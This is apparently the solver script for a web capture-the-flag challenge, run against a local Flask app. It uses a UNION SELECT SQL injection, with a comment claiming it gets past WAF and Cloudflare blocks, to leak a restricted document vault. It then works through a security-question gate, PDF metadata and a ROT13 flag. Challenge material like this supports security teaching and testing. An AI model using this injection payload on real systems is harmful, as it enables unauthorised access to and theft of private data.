import os
import re
import sys
import codecs

# Add challenge directory to Python path to use Flask test client
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'challenge')))
from app import app, init_db

def solve():
    print("[+] Step 1: Initializing CTF Web Target & Vault...")
    init_db()
    client = app.test_client()
    
    print("[+] Step 2: Exploiting Web Search via Medium-Hard UNION SQL Injection...")
    # Using Medium-Hard UNION SELECT bypass payload (avoids WAF blacklist and Cloudflare 403)
    sqli_payload = "%' UNION SELECT title, access_level, file_path, author FROM documents WHERE access_level LIKE '%"
    res = client.post("/search", data={'q': sqli_payload})
    html = res.data.decode('utf-8')
    
    # Verify multiple confidential/restricted decoys leaked
    if "Internal Security Architecture Review" not in html or "Q3 Network Infrastructure Topology" not in html:
        print("[-] SQL Injection failed to leak the document vault!")
        return False
    print("[+] Success! Leaked entire vault containing 7 public, confidential, and restricted documents!")
    
    # Identify target author employee ID from Arthur Pendelton's record
    target_empid_match = re.search(r"EMP-([0-9]+)", html)
    if not target_empid_match:
        print("[-] Failed to find Target Employee ID in leaked document records!")
        return False
    target_empid = target_empid_match.group(1)
    print(f"[+] Identified Target Author Employee ID: EMP-{target_empid}")
    
    print("[+] Step 3: Conducting OSINT Recon on Team Directory...")
    res_team = client.get("/team")
    team_html = res_team.data.decode('utf-8')
    
    # Locate Arthur Pendelton's Project Codename
    member_cards = team_html.split('<div class="card">')
    target_card = None
    for card in member_cards:
        if f"EMP-{target_empid}" in card:
            target_card = card
            break
            
    project_match = re.search(r"Project ([A-Z0-9-]+)\.", target_card)
    osint_key = f"{project_match.group(1)}-{target_empid}"
    print(f"[+] Verified OSINT passphrase / project clearance: {osint_key}")
    
    print("[+] Step 4: Bypassing Security Challenge Question Gate (/download/5)...")
    # Arthur's document is ID 5. Question: Which Linux command is used to change file permissions? Ans: chmod
    res_gate = client.post("/download/5", data={'answer': 'chmod'})
    gate_html = res_gate.data.decode('utf-8')
    if "Access Granted" not in gate_html:
        print("[-] Failed to pass security challenge gate for target PDF!")
        return False
    print("[+] Correctly answered security password ('chmod'). Success audio played & download initiated!")
    
    print("[+] Step 5: Downloading PDF & Inspecting Metadata Subject...")
    res_pdf = client.get("/static/confidential_memo.pdf")
    pdf_bytes = res_pdf.data
    print(f"[+] Downloaded confidential_memo.pdf ({len(pdf_bytes)} bytes)!")
        
    # Search for ROT13 Cipher inside Document Properties Subject field
    cipher_match = re.search(rb"ROT13 Cipher:\s*([a-zA-Z0-9_{}-]+)", pdf_bytes)
    if not cipher_match:
        print("[-] ROT13 Cipher not found in PDF metadata properties!")
        return False
        
    rot13_cipher = cipher_match.group(1).decode('ascii')
    print(f"[+] Found ROT13 Encrypted Cipher in Subject: {rot13_cipher}")
    
    print("[+] Step 6: Decrypting ROT13 Cipher ('thirteen steps to secrets keep')...")
    flag_str = codecs.decode(rot13_cipher, 'rot_13')
    print(f"[+] Decrypted string content: {flag_str}")
    
    if "rvcectf{" in flag_str:
        print(f"\n[*] CHALLENGE VERIFIED SOLVED! True Flag retrieved: {flag_str}")
        return True
    else:
        print("[-] True flag format not detected in decrypted output.")
        return False

if __name__ == "__main__":
    success = solve()
    if not success:
        sys.exit(1)
